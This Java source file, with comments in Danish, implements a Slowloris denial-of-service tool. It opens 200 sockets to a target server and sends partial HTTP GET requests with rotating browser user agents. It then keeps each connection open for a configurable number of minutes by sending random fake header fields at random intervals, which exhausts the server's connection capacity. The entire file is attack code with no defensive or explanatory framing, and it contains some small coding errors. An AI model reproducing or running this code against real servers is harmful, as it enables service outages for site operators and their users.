package com.company.SlowLoris;

import java.io.IOException;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.Socket;
import java.net.URL;
import java.util.Random;

public class Connector implements Runnable{

    private static final int NUMBER_OF_CONNECTIONS = 200;
    private int serverPort = 8080;
    private int attackMinutes = 10;
    private URL targetURL = new URL("localhost");


    private Socket[] allSockets = new Socket[NUMBER_OF_CONNECTIONS];
    private String[] allPartialRequests = new String[NUMBER_OF_CONNECTIONS];

    public Connector(String target, int serverPort, int attackMinutes) throws MalformedURLException {

        this.serverPort = serverPort;
        this.attackMinutes = attackMinutes;
        String targetPrefix = target.startsWith("http://") ? "" : "http://";
        targetURL = new URL(targetPrefix+target);
        allPartialRequests = createInitialPartialRequests();

        for (int i = 0; i < NUMBER_OF_CONNECTIONS; i++) {
            initConnection(i);
        }

    }

    private String[] createInitialPartialRequests(){

        String pagePrefix = "/";
        if (targetURL.getPath().startsWith("/")){
            pagePrefix = "";
        }

        // en hel http header
        String type = "GET" + pagePrefix + targetURL.getPath() + "HTTP/1.1\r\n";
        String host = "Host: " + targetURL.getHost() + (serverPort == 80 ? "" : ":" +serverPort) + "\r\n";
        String contentType = "Content-Type: */* \r\n";
        String connection = "Connection: keep-alive\r\n";

        String[] agents = {
                "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
                "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
                "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-TW; rv:1.9.0.9) Gecko/2009040821",
                "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
                "Mozilla/5.0 (Windows; U; Windows NT 6.1; it; rv:2.0b4) Gecko/20100818",
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36",
                "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
                "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)",
                "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
                "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
                "Mozilla/5.0 (Windows NT 5.1; U; zh-cn; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.70",
                "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36",
                "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36"
        };

        String[] allPartials = new String[NUMBER_OF_CONNECTIONS];
        for (int i = 0; i < NUMBER_OF_CONNECTIONS; i++) {
            allPartials[i] = type + host + contentType + connection + agents[new Random().nextInt(agents.length)] + "\r\n";
        }

        return allPartials;

    }

    private void initConnection(int index){

        try {

            System.out.println("Connector: " + toString() + "       Connecting: " + index);
            allSockets[index] = new Socket(InetAddress.getByName(targetURL.toExternalForm().replace("htpp://", "")), serverPort);

        } catch (IOException ioe){
            ioe.printStackTrace();
            System.exit(-1);
        }
    }

    @Override
    public void run(){

        long startTime = System.currentTimeMillis();

        for (int i = 0; i < NUMBER_OF_CONNECTIONS ; i++) {

            System.out.println("Connector: "+ toString() + "        Sending partial request: " + i);
            sendPartialRequest(i);

            try {
                Thread.sleep(new Random().nextInt(2138));
            } catch (InterruptedException IEx){
                IEx.printStackTrace();
            }
        }

        //MainLidtSkrald attack loop
        while ((System.currentTimeMillis() - startTime) < (attackMinutes * 60 * 1000)){
            attack();
        }

        CloseAllConnections();

    }


    //lukker alle forbindelser ved at sende en header afslutning til alle forbindelser
    private void CloseAllConnections(){

        for (int i = 0; i < NUMBER_OF_CONNECTIONS ; i++) {

            try{

                allSockets[i].getOutputStream().write("\r\n".getBytes());

            } catch (IOException ioe){
                ioe.printStackTrace();
            }
        }
    }

    // sender meningsløst vrøvl til serveren uden at lukke forbindelsen, hvilket holder forbindelsen åben
    private void attack(){

        for (int i = 0; i < NUMBER_OF_CONNECTIONS; i++) {

            sendFalseHeaderField(i);

            try {

                //Venter et random styk tid før den sender mere vrøvl
                Thread.sleep(new Random().nextInt(3407));

            } catch (InterruptedException IEx){
                IEx.printStackTrace();
            }

        }
    }

    //sender en falsk header til serveren så forbindelsen forbliver åben
    private void sendFalseHeaderField(int index){

        char[] alphabet = "abcdefghijklmnopqrstuwxæøå".toCharArray();
        String fakeField = alphabet[new Random().nextInt(alphabet.length)] + "-" + alphabet[new Random().nextInt(alphabet.length)] + ": " + new Random().nextInt() + "\r\n";

        try {
            allSockets[index].getOutputStream().write(fakeField.getBytes());
        } catch (IOException ioe){
            ioe.printStackTrace();
        }
    }


    // sender en del af et HTTP GET request til serveren
    private void sendPartialRequest(int index){

        try {
            //skriver en tilfældig del af et HTTP GET request
            allSockets[index].getOutputStream().write(allPartialRequests[new Random().nextInt(NUMBER_OF_CONNECTIONS)].getBytes());
        } catch (IOException ioe){
            ioe.printStackTrace();
            //forsøger at genoprette forbindelse
            initConnection(index);
        }

    }


}
